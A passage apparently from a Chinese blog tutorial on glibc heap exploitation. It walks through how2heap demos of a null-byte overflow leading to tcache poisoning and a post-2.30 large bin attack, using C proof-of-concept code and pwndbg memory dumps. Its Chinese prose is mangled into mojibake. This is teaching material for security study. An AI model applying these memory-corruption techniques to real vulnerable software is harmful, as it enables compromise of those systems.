b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *c = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* c_size_ptr = (<span class="keyword">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h3><p>é€šè¿‡è¯¥æŠ€æœ¯å‘ç›®æ ‡åœ°å€å†™å…¥ä¸€ä¸ªå¤§å€¼</p><p>2.30 ä¹‹åå…³äº largs bin çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŠ äº†ä¸¤ä¸ªæ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä»¥åŠ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯¼è‡´ä¼ ç»Ÿçš„ large bin attack æ²¡æ³•ä½¿ç”¨</p><p>ä½†æ˜¯å­˜åœ¨ä¸€ä¸ªæ–°çš„åˆ©ç”¨è·¯å¾„: </p><p>é¦–å…ˆå¸ƒç½®å¦‚ä¸‹çš„ heap </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x430</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596c0</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555596e0</span>      <span class="number">0x0</span>                 <span class="number">0x420</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b00</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>0x20 çš„ä¸º  guard chunk ï¼Œé¿å… free ä¹‹å chunk åˆå¹¶ , ç„¶åæˆ‘ä»¬free p1ï¼Œæ­¤æ—¶ chunk p1 ä¼šæ”¾å…¥ unsortedbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">54</span>   <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line">   <span class="number">55</span></span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line"> â–º <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">   <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">64</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe280</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe288</span> â€”â–¸ <span class="number">0x5555555592a0</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â€”â–¸ <span class="number">0x555555559b20</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe290</span> â€”â–¸ <span class="number">0x5555555596d0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe298</span> â€”â–¸ <span class="number">0x5555555596f0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe2a0</span> â€”â–¸ <span class="number">0x555555559b10</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fffffffe2a8</span> â€”â–¸ <span class="number">0x555555555140</span> (_start) â—‚â€” endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe2b0</span> â€”â–¸ <span class="number">0x7fffffffe3b0</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe2b8</span> â—‚â€” <span class="number">0xf7624ffb64d1fe00</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">5555555553f</span>a main+<span class="number">465</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559290</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559290</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å†  malloc ä¸€ä¸ªæ¯” p1 å¤§çš„ chunkï¼Œæ­¤æ—¶ p1 ä¼šè¢«æ”¾å…¥åˆ° lagrebin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> â–º <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> â€”â–¸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) â—‚â€” <span class="number">0x555555559290</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åœ¨ free p2  ( p2 å¤§å°å°äº p1 hå’Œ p3) , æ­¤æ—¶ p2 å°±ä¼šè¢«æ”¾å…¥åˆ° unsortedbin é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">65</span>   <span class="built_in">free</span>(p2);</span><br><span class="line"> â–º <span class="number">66</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">   <span class="number">67</span>   <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">68</span>   <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555596e0</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x5555555596e0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> â€”â–¸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) â—‚â€” <span class="number">0x555555559290</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹ p1 çš„ bk_nextsize æŒ‡å‘ target-0x20 , æ­¤æ—¶çš„ p1 åœ¨ largebin é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> â–º <span class="number">72</span>   p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">   <span class="number">73</span>   <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span> &lt;------ bk-&gt;nextsize</span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p &amp;target</span><br><span class="line">$<span class="number">14</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffe280</span></span><br><span 